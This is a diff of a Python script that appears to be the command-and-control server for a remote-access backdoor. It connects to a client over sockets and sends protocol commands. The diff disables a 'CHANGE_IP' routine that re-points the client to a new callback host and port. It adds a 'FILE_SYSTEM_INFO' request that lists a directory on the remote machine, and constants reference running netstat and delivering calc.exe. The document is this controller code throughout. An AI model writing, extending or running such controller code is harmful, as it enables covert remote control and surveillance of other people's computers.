@@ -15,6 +15,7 @@ FILE_PATH = "C:\\Users\\admin\\Downloads\\calc.exe"
 EXE_STR = "netstat -a -n -o"
 NEW_IP = "192.168.43.49"
 NEW_PORT = 4001
+FILE_INFO_DIR = r"C:\Users\admin\Desktop\New folder"
 CHUNK_SIZE = 1024
 
 
@@ -30,8 +31,8 @@ def bin_file_to_buffer(file_path):
 
 
 if __name__ == '__main__':
-    TCP_IP = '127.0.0.1'
-    TCP_PORT = 5004
+    TCP_IP = '192.168.43.49'
+    TCP_PORT = 5005
     BUFFER_SIZE = 1024
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -74,24 +75,33 @@ if __name__ == '__main__':
         # conn.send("END_EXECUTE".encode())
         # data = conn.recv(BUFFER_SIZE)  # ok for packgae
 
+        # Change IP
+        # while True: # TODO: timeout or scheduler
+        #     conn.send("CHANGE_IP".encode())
+        #     data = conn.recv(2)  # ok for packgae
+        #     # send size of packet
+        #     packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
+        #     conn.send(str(len(packet_str)).encode())
+        #     data = conn.recv(2)  # ok for packgae
+        #     conn.send(packet_str.encode())
+        #     data = conn.recv(2)  # ok for packgae
+        #     data = conn.recv(6)
+        #     if data.decode() == 'accept':
+        #         print(str(data))
+        #         break
+
         # file system info
         conn.send("FILE_SYSTEM_INFO".encode())
         data = conn.recv(2)  # ok for packgae
-
-        # Change IP
-        while True: # TODO: timeout or scheduler
-            conn.send("CHANGE_IP".encode())
-            data = conn.recv(2)  # ok for packgae
-            # send size of packet
-            packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
-            conn.send(str(len(packet_str)).encode())
-            data = conn.recv(2)  # ok for packgae
-            conn.send(packet_str.encode())
-            data = conn.recv(2)  # ok for packgae
-            data = conn.recv(6)
-            if data.decode() == 'accept':
-                print(str(data))
-                break
+        conn.send(str(len(FILE_INFO_DIR)).encode())
+        data = conn.recv(2)  # ok for packgae
+        conn.send(FILE_INFO_DIR.encode())
+        data = conn.recv(2)  # ok for packgae
+        size = conn.recv(BUFFER_SIZE) # get response size
+        conn.send("OK".encode())
+        data = conn.recv(int(size))
+        conn.send("OK".encode())
+        print(data.decode())
 
 
 conn.close()
